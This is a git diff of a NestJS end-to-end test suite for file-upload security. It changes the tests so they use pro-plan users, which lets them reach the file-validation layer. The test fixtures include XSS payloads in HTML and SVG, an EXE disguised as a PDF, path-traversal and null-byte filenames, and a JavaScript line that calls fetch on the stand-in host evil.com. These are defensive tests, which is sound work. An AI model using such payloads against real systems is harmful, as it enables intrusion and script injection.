@@ -1,7 +1,11 @@
 import { INestApplication } from '@nestjs/common';
 // eslint-disable-next-line @typescript-eslint/no-require-imports
 const request = require('supertest') as typeof import('supertest');
-import { createTestApp, createAuthenticatedUser } from './helpers';
+import {
+  createTestApp,
+  createAuthenticatedUser,
+  updateSubscriptionPlan,
+} from './helpers';
 
 /**
  * File Upload Security E2E tests (Phase 2 — Coverage Gaps).
@@ -29,6 +33,16 @@ describe('File Upload Security (E2E)', () => {
   afterAll(async () => {
     await app.close();
   });
+
+  /**
+   * POST /uploads is plan-gated (documentUploadsPerMonth: pro+ only), so
+   * file-validation tests need a pro user to reach the validation layer.
+   */
+  async function createProUser(email: string) {
+    const user = await createAuthenticatedUser(app, { email });
+    await updateSubscriptionPlan(app, user.accessToken, 'pro');
+    return user;
+  }
 
   // Valid JPEG buffer (1x1 pixel) for comparison
   function createTestJpegBuffer(): Buffer {
@@ -80,9 +94,7 @@ describe('File Upload Security (E2E)', () => {
 
   describe('MIME type / magic byte validation', () => {
     it('should reject a file with mismatched MIME type (EXE disguised as PDF)', async () => {
-      const user = await createAuthenticatedUser(app, {
-        email: `mime-mismatch-${Date.now()}@test.com`,
-      });
+      const user = await createProUser(`mime-mismatch-${Date.now()}@test.com`);
 
       // EXE magic bytes: MZ (4D 5A)
       const exeBuffer = Buffer.from([
@@ -105,9 +117,7 @@ describe('File Upload Security (E2E)', () => {
     });
 
     it('should reject a file with disallowed MIME type (HTML)', async () => {
-      const user = await createAuthenticatedUser(app, {
-        email: `mime-html-${Date.now()}@test.com`,
-      });
+      const user = await createProUser(`mime-html-${Date.now()}@test.com`);
 
       const htmlBuffer = Buffer.from('<html><body><script>alert("xss")</script></body></html>');
 
@@ -124,9 +134,7 @@ describe('File Upload Security (E2E)', () => {
     });
 
     it('should reject a JavaScript file disguised as image', async () => {
-      const user = await createAuthenticatedUser(app, {
-        email: `mime-js-${Date.now()}@test.com`,
-      });
+      const user = await createProUser(`mime-js-${Date.now()}@test.com`);
 
       const jsBuffer = Buffer.from('function exploit() { fetch("http://evil.com") }');
 
@@ -143,9 +151,7 @@ describe('File Upload Security (E2E)', () => {
     });
 
     it('should reject a SVG file (potential XSS vector)', async () => {
-      const user = await createAuthenticatedUser(app, {
-        email: `mime-svg-${Date.now()}@test.com`,
-      });
+      const user = await createProUser(`mime-svg-${Date.now()}@test.com`);
 
       const svgBuffer = Buffer.from(
         '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
@@ -166,9 +172,7 @@ describe('File Upload Security (E2E)', () => {
 
   describe('Filename sanitization', () => {
     it('should reject or sanitize path traversal in filename', async () => {
-      const user = await createAuthenticatedUser(app, {
-        email: `path-trav-${Date.now()}@test.com`,
-      });
+      const user = await createProUser(`path-trav-${Date.now()}@test.com`);
 
       const res = await request(app.getHttpServer())
         .post('/api/v1/uploads')
@@ -190,9 +194,7 @@ describe('File Upload Security (E2E)', () => {
     });
 
     it('should reject filenames with null bytes', async () => {
-      const user = await createAuthenticatedUser(app, {
-        email: `null-byte-${Date.now()}@test.com`,
-      });
+      const user = await createProUser(`null-byte-${Date.now()}@test.com`);
 
       const res = await request(app.getHttpServer())
         .post('/api/v1/uploads')
@@ -211,9 +213,7 @@ describe('File Upload Security (E2E)', () => {
     });
 
     it('should handle double-extension filenames', async () => {
-      const user = await createAuthenticatedUser(app, {
-        email: `double-ext-${Date.now()}@test.com`,
-      });
+      const user = await createProUser(`double-ext-${Date.now()}@test.com`);
 
       const res = await request(app.getHttpServer())
         .post('/api/v1/uploads')
@@ -279,9 +279,7 @@ describe('File Upload Security (E2E)', () => {
   // with the standard NestJS exception envelope.
   describe('Empty and missing files', () => {
     it('should reject empty file upload with 400', async () => {
-      const user = await createAuthenticatedUser(app, {
-        email: `empty-file-${Date.now()}@test.com`,
-      });
+      const user = await createProUser(`empty-file-${Date.now()}@test.com`);
 
       const emptyBuffer = Buffer.alloc(0);
 
@@ -361,9 +359,7 @@ describe('File Upload Security (E2E)', () => {
 
   describe('Upload response security', () => {
     it('should not expose internal file paths in response', async () => {
-      const user = await createAuthenticatedUser(app, {
-        email: `no-paths-${Date.now()}@test.com`,
-      });
+      const user = await createProUser(`no-paths-${Date.now()}@test.com`);
 
       const res = await request(app.getHttpServer())
         .post('/api/v1/uploads')
@@ -384,9 +380,7 @@ describe('File Upload Security (E2E)', () => {
     });
 
     it('should not expose S3 keys or bucket names in error responses', async () => {
-      const user = await createAuthenticatedUser(app, {
-        email: `no-s3-leak-${Date.now()}@test.com`,
-      });
+      const user = await createProUser(`no-s3-leak-${Date.now()}@test.com`);
 
       // Send an invalid file to trigger an error
       const res = await request(app.getHttpServer())
